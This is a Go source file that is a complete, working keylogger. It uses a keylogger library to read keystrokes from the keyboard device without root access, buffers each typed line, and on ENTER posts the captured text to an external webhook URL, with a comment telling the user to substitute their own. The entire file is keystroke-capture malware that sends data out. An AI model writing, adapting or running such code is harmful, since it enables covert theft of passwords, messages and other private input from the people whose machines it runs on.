package main

import (
	"net/http"
	"strings"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

var (
	webhook = "https://requestbin.io/1qq5fg11" // replace with your webhook url
)

func ReadKey() {
	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	// init keylogger with keyboard
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()

	// length of events to send to server
	a := []string{}
	// range of events
	for e := range events {
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				txt := Parser(e.KeyString())
				a = append(a, txt)
				print(a[len(a)-1])
				if e.KeyString() == "ENTER" {
					
					SendToServer("[event] "+ strings.Join(a, ""))
					a = []string{}
				}
			}
			break
		}
	}
}

func SendToServer(txt string){
	// send txt to server
	http.Post(webhook, "text/plain", strings.NewReader(txt))
}

func Parser(press string) string {
	// parsing ugly keylogger key string
	press = strings.Replace(press, "ENTER", "\\n", -1)
	press = strings.Replace(press, "BS", "\b", -1)
	press = strings.Replace(press, "SPACE", " ", -1)
	// only accept press with one bytes
	if len(press) > 1 {
		return ""
	}
	return press
}

func main() {
	ReadKey()
}
